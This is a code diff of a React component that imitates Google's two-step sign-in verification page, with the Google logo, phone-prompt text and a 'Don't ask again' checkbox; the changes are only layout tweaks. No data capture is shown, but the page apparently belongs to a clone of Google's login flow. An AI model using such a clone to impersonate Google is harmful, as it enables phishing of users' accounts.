@@ -7,11 +7,7 @@ export default function Verification() {
     <div className="font-roboto min-h-screen md:flex flex-col justify-center items-center bg-white text-[#202124] text-base">
       <div className="md:border border-slate-300 rounded-lg px-6 md:px-10 py-9 md:w-[450px] h-[500px]">
         <div className="flex justify-center">
-          <img
-            class="w-44 -ml-[70px]"
-            src="/images/animation.gif"
-            alt="animation"
-          />
+          <Image src="/images/google.png" alt="google" width={82} height={30} />
         </div>
 
         <div className="mt-2.5">
@@ -24,11 +20,10 @@ export default function Verification() {
           </div>
           <div className="">
             <div className="">
-              <Image
-                src="/images/mobile.gif"
-                alt="google"
-                width={82}
-                height={80}
+              <img
+                class="w-44 -ml-[70px]"
+                src="/images/animation.gif"
+                alt="animation"
               />
             </div>
             <div className="flex flex-col justify-start text-start m-3">
@@ -37,9 +32,9 @@ export default function Verification() {
                 Google sent a notification to your Phone. Tap Yes on the
                 notification to verify it's you.
               </p>
-              <div className="flex pl-3git ">
+              <div className="flex pt-3">
                 <input type="checkbox" />
-                <p>Don't ask again on this device</p>
+                <p className="ml-3">Don't ask again on this device</p>
               </div>
               <div className=" flex flex-col justify-start text-start">
                 <button>
